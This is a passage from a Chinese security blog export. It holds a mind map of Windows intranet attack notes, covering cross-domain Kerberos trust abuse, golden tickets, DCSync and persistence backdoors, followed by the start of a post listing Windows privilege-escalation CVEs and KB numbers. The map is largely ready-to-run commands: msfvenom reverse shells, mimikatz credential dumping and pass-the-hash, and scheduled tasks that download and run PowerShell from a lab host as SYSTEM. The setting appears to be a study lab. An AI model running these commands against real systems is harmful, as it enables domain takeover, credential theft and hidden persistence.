      &lt;node TEXT=&quot;mimikatz导出kirbi格式文件：kerberos::clist &amp;quot;20141223201326_default_172.16.158.135_windows.kerberos_194320.bin&amp;quot; /export&quot; ID=&quot;1cf1736f7a443917c&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.86.135 LPORT=4444 -f exe &amp;gt; shell.exe 执行后，获取meterpreter权限 &quot; ID=&quot;18b17370017b09025&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;执行命令getuid应该是user1/pentest.com权限 ，执行命令load kiwi 然后再输入kerberos_ticket_use /tmp/0-00000000-user1@krbtgt-pentest.com.kirbi导入票据&quot; ID=&quot;22e173700381c2089&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;再输入background切换到meterpreter后台，获取后台session会话id&quot; ID=&quot;1e51737004d97403e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;use exploit/windows/local/current_user_psexec  [set TECHNIQUE PSH][set RHOSTS WIN-F46QAN3U3UH.pentest.com][set payload windows/meterpreter/reverse_tcp][set lhost 172.16.86.135][set SESSION 1][exploit] &quot; ID=&quot;3051737005b85b0e1&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
&lt;/node&gt;
&lt;node TEXT=&quot;七、跨域攻击[看这篇吧：https://www.cnblogs.com/micr067/p/12984136.html]&quot; ID=&quot;3271735a6aed8c0ba&quot; STYLE=&quot;bubble&quot; POSITION=&quot;left&quot;&gt;
  &lt;node TEXT=&quot;利用域信任关系的跨域攻击 &quot; ID=&quot;23e173700838c2122&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;域信息关系&quot; ID=&quot;1617370087c7a124&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;单向信任：在两个域之间创建单向的信任路径，即在一个方向上是信任流，在另一个方向上是访问流。在受信任域和信任域之间的单向信任中，受信任域内的用户可以访问信任域内的资源。&quot; ID=&quot;13717370088c4a037&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;双向信任：指两个单向信任的组合，信任域和受信任域彼此信任，在两个方向上都有信任流和访问流，活动目录中的所有域信任关系都是双向可传递的。&quot; ID=&quot;1ba173702bf54a11f&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;默认情况下，使用活动目录安装向导将新域添加到域权或林根域中，会自动创建双向可传递信任&quot; ID=&quot;23217370364ce1057&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;外部信任：是指两个不同林中的域的信任关系，外部信任是不可传递的。&quot; ID=&quot;3e71737036eaf9149&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;获取 域信息[lg.exe]&quot; ID=&quot;385173703755f911c&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;枚举lab域中的用户组：lg.exe lab\.&quot; ID=&quot;6417370376ce8032&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;枚举远程机器 的本地组用户：lg.exe \\dc -lu&quot; ID=&quot;264173703aadf1127&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;枚举所有用户的SID： lg.exe \\dc -lu -sidsout&quot; ID=&quot;12d17370452c28098&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;利用域信任密钥获取 目标域的权限&quot; ID=&quot;3ba17370470a29042&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;场景描述&quot; ID=&quot;3817370473b5807b&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;父域域控：dc.test.com&quot; ID=&quot;225173704bff4909a&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;子域域控：sub.test.com&quot; ID=&quot;9f173704c2f50144&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;子域计算机：pc.sub.test.com&quot; ID=&quot;2c7173704c56350ca&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;子域用户：sub\test&quot; ID=&quot;99173704dd2d10d2&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;在子域域控上执行mimikatz.exe privilege::debug &amp;quot;lsadump::lsa /patch /user:tset$&amp;quot; &amp;quot;lsadump::trust /patch&amp;quot; exit&quot; ID=&quot;73173704df4f8107&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;创建信任票据:mimikatz &amp;quot;kerberos::golden /domain:sub.test.com /sid:S-1-5-21-3286823404-654603728-2254694439 /sids:S-1-5-21-1150252187-1650404275-3011793806-519 /rc4:f430c584462c52bc2291fea8705031c5 /user:DarthVader /service:krbtgt /target:test.com /ticket:payload.kiribi&amp;quot; exit&quot; ID=&quot;10617370530de9009&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;利用刚刚创建的payload.kiribi的信任票据获取目标域中目标服务的TGS并保存到文件中:Asktgs payload.kiribi CIFS/dc.test.com&quot; ID=&quot;1ec17370595be9135&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;将获取的TGS票据注入内存：kiribikator lsa CIFS.dc.test.com.kiribi&quot; ID=&quot;30a173705a257114d&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;访问目标服务:dir \\dc.test.com\c$&quot; ID=&quot;33f173705abc4018d&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;利用krbtgt hash获取目标域权限 &quot; ID=&quot;2a3173705b35b0124&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;在域控上获取krbtgt hash&quot; ID=&quot;35e173705b84b00b4&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;mimikatz privilege::debug &amp;quot;lsadump::lsa /patch /user:krbtgt&amp;quot; sekurlsa::krbtgt exit&quot; ID=&quot;f8173705be48f0cb&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;在子域内的计算机上（pc.sub.test.com）上使用普通用户权限（sub\test）构造并注入黄金票据，获取目标域的权限&quot; ID=&quot;3571737060a510199&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;mimikatz &amp;quot;kerberos::golden /user:administrator /domain:selas.payload.com /sid:S-1-5-21-3286823404-654603728-2254694439 /sids:S-1-5-21-1150252187-1650404275-3011793806-519 /krbtgt:ffc79c6f14bb2c39e6ceab183cefc9c5 /ptt&amp;quot; exit&quot; ID=&quot;29c173706284800ae&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;访问目标服务:dir \\dc.test.com\c$&quot; ID=&quot;29d17370647c40001&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;外部信任和林信任&quot; ID=&quot;c717370668120132&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;利用信任关系获取信任域的信息&quot; ID=&quot;1621737066ad2803&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;adfind -h payload.com -sc u:administrator&quot; ID=&quot;3c717370681c1017a&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;使用powerview定位敏感用户&quot; ID=&quot;339173706866c1024&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;.\powerview.ps1&quot; ID=&quot;3c417370686c78042&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;Get-DomainForeignGroupMember -Domain payload.com&quot; ID=&quot;3e5173706893180fc1&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;利用无约束委派和MS-RPRN获取信任林权限&quot; ID=&quot;130173706902a8064&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;使用rubeus工具，监控身份认证请求&quot; ID=&quot;35f173706a4bb80a8&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;rubeus.exe monitor /interval:5 /filteruser:BDC$&quot; ID=&quot;2f9173706a56810ac&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;开启监听后，在命令行环境下执行如下命令，使用SpoolSample工具让目标域控制器bcd.b.com向dc.a.com发送身份认证请求&quot; ID=&quot;255173706aafb8003&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;SpoolSample.exe bdc.b.com dc.a.com&quot; ID=&quot;201173706ab7000b1&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;rubeus会捕获来自bdc.b.com的认证请求，保存其中的TGT数据。清除TGT数据文件中多余的换行符，然后使用rubeus工具将票据注入内存&quot; ID=&quot;390173706ad8c9126&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;Rubeus.exe ptt /ticket:&amp;lt;TGT 数据&amp;gt;&quot; ID=&quot;9173706e2d770a5&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;使用mimikatz获取目标域的krbtgt散列值。使用mimikatz的dcsync功能，模拟域控制器向目标域控制器发送请求（获取账户密码）&quot; ID=&quot;241173706e47a003c&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;mimikatz &amp;quot;lsadump::dcsync /domain:b.com /user:b\krbtgt&amp;quot; exit&quot; ID=&quot;e4173706e704116b&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;构造黄金票据并将其注入内存，获取目标域控制器的权限&quot; ID=&quot;81173706e8e2106a&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;mimikatz &amp;quot;kerberos::golden /user:administrator /domain:b.com /sid: /rc4: /ptt&amp;quot; exit&quot; ID=&quot;60173706ea351148&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;最后访问目标服务&quot; ID=&quot;1c0173706eb4df0f4&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;dir \\bdc.com\c$&quot; ID=&quot;1c4173706eeb7007c&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
  &lt;/node&gt;
&lt;/node&gt;
&lt;node TEXT=&quot;八、权限维持&quot; ID=&quot;1501735a6b136316c&quot; STYLE=&quot;bubble&quot; POSITION=&quot;left&quot;&gt;
  &lt;node TEXT=&quot;操作系统后门&quot; ID=&quot;37173707072f0097&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;粘滞键后门&quot; ID=&quot;2c817370708d2002a&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;命令行&quot; ID=&quot;29017370716e2218c&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;cd c:\windows\system32&quot; ID=&quot;24817370718038144&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;move sethc.exe sethc.exe.bak&quot; ID=&quot;5e1737071a470029&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;copy cmd.exe sethc.exe&quot; ID=&quot;3671737071c530108&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;Empire&quot; ID=&quot;2461737071e578187&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;usemodule lateral_movement/invoke_wmi_debuggerinfo&quot; ID=&quot;3011737071fb2008d&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;set Listener  shuteer&quot; ID=&quot;2441737073507902a&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;set ComputerName  WIN7-64.shuteer.testlab&quot; ID=&quot;2173707350791481&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;set TargetBinary sethc.exe&quot; ID=&quot;118173707350790bd2&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;execute&quot; ID=&quot;93173707350790633&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;注册表后门&quot; ID=&quot;3351737074b45000e&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;Empire&quot; ID=&quot;aa1737074d20816d&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;usemodule persistence/userland/registry&quot; ID=&quot;2b817370750a19114&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;set Listener shuteer&quot; ID=&quot;220173707533c013d&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run&quot; ID=&quot;17c173707541b61841&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;execute&quot; ID=&quot;126173707541b61172&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;计划任务后门&quot; ID=&quot;3261737075e0e0122&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;基本命令：schtasks /create /tn updater /tr notepad.exe /sc hourly /mo 1  [每小时执行一次notepad]&quot; ID=&quot;2e31737078a5e804a&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Empire&quot; ID=&quot;c11737075f8b00b&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;usemodule persistence/elevated/schtasks&quot; ID=&quot;1e217370762148082&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;Set DailyTime 16:17&quot; ID=&quot;29c173707758c8009&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;Set Listener test&quot; ID=&quot;2b8173707759cf0411&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;execute&quot; ID=&quot;dc173707759cf0ea2&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;Metasploit&quot; ID=&quot;b617370786320067&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;托管和生成各种格式&quot; ID=&quot;249173707c44b90d4&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;use exploit/multi/script/web_delivery&quot; ID=&quot;151173707be34f149&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;set payload windows/x64/meterpreter/reverse_tcp&quot; ID=&quot;18e173707be34f18a1&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;set LHOST 10.0.2.21&quot; ID=&quot;8d173707be34f0ad2&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;set target 5&quot; ID=&quot;196173707be34f0263&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;exploit&quot; ID=&quot;265173707be34f0de4&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;系统启动时&quot; ID=&quot;1ad173707c00b818b&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;【x64】schtasks /create /tn PentestLab /tr &amp;quot;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &amp;apos;IEX ((new-object net.webclient).downloadstring(&amp;apos;&amp;apos;http://10.0.2.21:8080/ZPWLywg&amp;apos;&amp;apos;&amp;apos;))&amp;apos;&amp;quot; /sc onstart /ru System&quot; ID=&quot;1a173707cc1e80bd&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;【x86】schtasks /create /tn PentestLab /tr &amp;quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &amp;apos;IEX ((new-object net.webclient).downloadstring(&amp;apos;&amp;apos;http://10.0.2.21:8080/ZPWLywg&amp;apos;&amp;apos;&amp;apos;))&amp;apos;&amp;quot; /sc onstart /ru System&quot; ID=&quot;250173707dd438111&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;用户登陆时&quot; ID=&quot;35c173707cea48192&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;schtasks /create /tn PentestLab /tr &amp;quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &amp;apos;IEX ((new-object net.webclient).downloadstring(&amp;apos;&amp;apos;http://10.0.2.21:8080/ZPWLywg&amp;apos;&amp;apos;&amp;apos;))&amp;apos;&amp;quot; /sc onlogon /ru System&quot; ID=&quot;d7173707d1aa8129&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;PowerSploit&quot; ID=&quot;e7173707eb4a7068&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -Hourly&quot; ID=&quot;36b17370817538156&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;$UserOptions = New-UserPersistenceOption -ScheduledTask -Hourly&quot; ID=&quot;2df173708179581121&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;Add-Persistence -FilePath C:\temp\empire.exe -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions&quot; ID=&quot;ae173708179581732&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;meterpreter&quot; ID=&quot;1b6173708244a0083&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Cymothoa&quot; ID=&quot;37017370825588041&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;WMI&quot; ID=&quot;31117370826a3804d&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;Empire  Invoke-WMI&quot; ID=&quot;f11737082ccd0084&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;Web后门&quot; ID=&quot;30317370847f0805f&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;Nishang下的webshell&quot; ID=&quot;1fa17370848ff0122&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;weevely&quot; ID=&quot;271737087970f15a&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;webacoo&quot; ID=&quot;1bb1737088676e114&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;meterpreter webshell&quot; ID=&quot;34b1737087bc18122&quot; STYLE=&quot;fork&quot;/&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;域控权限持久化&quot; ID=&quot;2a1737089366f0b5&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;DSRM域后门&quot; ID=&quot;1a17370895c4f131&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;使用mimikatz查看krbtgt的NTLM hash&quot; ID=&quot;398173708a59b016a&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;privilege::debug&quot; ID=&quot;ee173708eb9d8174&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;lsadump::lsa /patch /name:krbtgt&quot; ID=&quot;234173708fac87092&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;使用mimikatz读取SAM中本地管理员的NTLM Hash&quot; ID=&quot;1be173708ed96f179&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;privilege::debug&quot; ID=&quot;77173708f395f0bb&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;token::elevate&quot; ID=&quot;1b5173708f7c0d0ee1&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;lsadump::sam&quot; ID=&quot;2c9173708f7c0d15d2&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;将DRSM帐号和krbtgt的NTLM Hash同步&quot; ID=&quot;b1173709007d0095&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;ntdsutil&quot; ID=&quot;2801737090856708c&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;set dsrm password&quot; ID=&quot;2281737090fbef178&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;sync from domain account krbtgt&quot; ID=&quot;3c81737091a917173&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;q&quot; ID=&quot;1a7173709165e802b&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;q&quot; ID=&quot;2c117370916947142&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;查看DSRM的NTLM Hash是否同步成功&quot; ID=&quot;ea1737091dca718f&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;lsadump::sam[NTLM Hash与第一步Hash值 相同]&quot; ID=&quot;2de17370921e40074&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;修改DSRM登陆方式&quot; ID=&quot;2e81737092b81002d&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;New-ItemProperty &amp;quot;hklm:\system\currentcontrolset\control\lsa\&amp;quot; -name &amp;quot;dsrmadminlogonbehavior&amp;quot; -value 2 -propertyType DWORD&quot; ID=&quot;3651737092da5016&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;使用本地administrator帐号PTH攻击域控&quot; ID=&quot;33c17370933a70164&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;privilege::Debug&quot; ID=&quot;1c11737093e87705c&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;sekurlsa::pth /domain:WIN2008 /user:administrator /ntlm:51b7f7dca9302c839e48d039ee37f0d1&quot; ID=&quot;3251737093fa0f17a1&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;使用mimikatz的dcysnc功能远程转储krbtgt&quot; ID=&quot;29c17370942410035&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;lsadump::dcsync /domain:pentest.com /dc:dc /user:krbtgt&quot; ID=&quot;4a17370946360062&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;SSP维持权限&quot; ID=&quot;817370959b370a2&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;SID HISTORY后门&quot; ID=&quot;361737095f098113&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;Golden Ticket&quot; ID=&quot;25c17370961977034&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;Silver Ticket&quot; ID=&quot;3aa1737096612f0db&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;Skeleton Key&quot; ID=&quot;7d17370969b8f04&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;HOOK PasswordChangeNotify&quot; ID=&quot;2c61737097185a11c&quot; STYLE=&quot;fork&quot;/&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;Nishang下的脚本后门&quot; ID=&quot;2261737097a9200d&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;HTTP-Backdoor&quot; ID=&quot;2c81737097c17f169&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;Add-ScrnSaveBackdoor&quot; ID=&quot;2e01737097d54000b&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;Execute-Ontime&quot; ID=&quot;28c1737098875711b&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;Invoke-ADSbackdoor&quot; ID=&quot;1491737098a4280a2&quot; STYLE=&quot;fork&quot;/&gt;
  &lt;/node&gt;
&lt;/node&gt;
&lt;node TEXT=&quot;九、CS&quot; ID=&quot;32a1735a6b2072186&quot; STYLE=&quot;bubble&quot; POSITION=&quot;left&quot;/&gt;</code></pre>
  </node>
</map>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>专注 APT 攻击与防御</title>
    <url>/2021/01/12/%E4%B8%93%E6%B3%A8%20APT%20%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%20-%20Micro8%20%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="专注-APT-攻击与防御-Micro8-读书笔记"><a href="#专注-APT-攻击与防御-Micro8-读书笔记" class="headerlink" title="专注 APT 攻击与防御 - Micro8 读书笔记"></a>专注 APT 攻击与防御 - Micro8 读书笔记</h1><h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="1-Window提权-快速查找EXP"><a href="#1-Window提权-快速查找EXP" class="headerlink" title="1. Window提权 快速查找EXP"></a>1. Window提权 快速查找EXP</h2><a id="more"></a>
<p>微软官方安全公告：<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017</a></p>
<p>参考链接：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
<p>常见提权漏洞及补丁编号如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MS17-017 [KB4013081] [GDI Palette Objects Local Privilege Escalation] (windows 7&#x2F;8)</span><br><span class="line">CVE-2017-8464 [LNK Remote Code Execution Vulnerability] (windows 10&#x2F;8.1&#x2F;7&#x2F;2016&#x2F;2010&#x2F;2008）</span><br><span class="line">CVE-2017-0213 [Windows COM Elevation of Privilege Vulnerability] (windows 10&#x2F;8.1&#x2F;7&#x2F;2016&#x2F;2010&#x2F;2008)</span><br><span class="line">MS17-010 [KB4013389] [Windows Kernel Mode Drivers](windows 7&#x2F;2008&#x2F;2003&#x2F;XP)</span><br><span class="line">MS16-135 [KB3199135] [Windows Kernel Mode Drivers] (2016)</span><br><span class="line">MS16-111 [KB3186973] [kernel api] (Windows 10 10586 (32&#x2F;64)&#x2F;8.1)</span><br><span class="line">MS16-098 [KB3178466] [Kernel Driver] (Win 8.1)</span><br><span class="line">MS16-075 [KB3164038] [Hot Potato] (2003&#x2F;2008&#x2F;7&#x2F;8&#x2F;2012)</span><br><span class="line">MS16-034 [KB3143145] [Kernel Driver] (2008&#x2F;7&#x2F;8&#x2F;10&#x2F;2012) </span><br><span class="line">MS16-032 [KB3143141] [Secondary Logon Handle] (2008&#x2F;7&#x2F;8&#x2F;10&#x2F;2012) </span><br><span class="line">MS16-016 [KB3136041] [WebDAV] (2008&#x2F;Vista&#x2F;7) </span><br><span class="line">MS15-097 [KB3089656] [remote code execution] (win8.1&#x2F;2012) </span><br><span class="line">MS15-076 [KB3067505] [RPC] (2003&#x2F;2008&#x2F;7&#x2F;8&#x2F;2012) </span><br><span class="line">MS15-077 [KB3077657] [ATM] (XP&#x2F;Vista&#x2F;Win7&#x2F;Win8&#x2F;2000&#x2F;2003&#x2F;2008&#x2F;2012) </span><br><span class="line">MS15-061 [KB3057839] [Kernel Driver] (2003&#x2F;2008&#x2F;7&#x2F;8&#x2F;2012) </span><br><span class="line">MS15-051 [KB3057191] [Windows Kernel Mode Drivers] (2003&#x2F;2008&#x2F;7&#x2F;8&#x2F;2012)</span><br><span class="line">MS15-010 [KB3036220] [Kernel Driver] (2003&#x2F;2008&#x2F;7&#x2F;8) </span><br><span class="line">MS15-015 [KB3031432] [Kernel Driver] (Win7&#x2F;8&#x2F;8.1&#x2F;2012&#x2F;RT&#x2F;2012 R2&#x2F;2008 R2) </span><br><span class="line">MS15-001 [KB3023266] [Kernel Driver] (2008&#x2F;2012&#x2F;7&#x2F;8) </span><br><span class="line">MS14-070 [KB2989935] [Kernel Driver] (2003) </span><br><span class="line">MS14-068 [KB3011780] [Domain Privilege Escalation] (2003&#x2F;2008&#x2F;2012&#x2F;7&#x2F;8) </span><br><span class="line">MS14-058 [KB3000061] [Win32k.sys] (2003&#x2F;2008&#x2F;2012&#x2F;7&#x2F;8) </span><br><span class="line">MS14-040 [KB2975684] [AFD Driver] (2003&#x2F;2008&#x2F;2012&#x2F;7&#x2F;8) </span><br><span class="line">MS14-002 [KB2914368] [NDProxy] (2003&#x2F;XP) </span><br><span class="line">MS13-053 [KB2850851] [win32k.sys] (XP&#x2F;Vista&#x2F;2003&#x2F;2008&#x2F;win 7) </span><br><span class="line">MS13-046 [KB2840221] [dxgkrnl.sys] (Vista&#x2F;2003&#x2F;2008&#x2F;2012&#x2F;7) </span><br><span class="line">MS13-005 [KB2778930] [Kernel Mode Driver] (2003&#x2F;2008&#x2F;2012&#x2F;win7&#x2F;8) </span><br><span 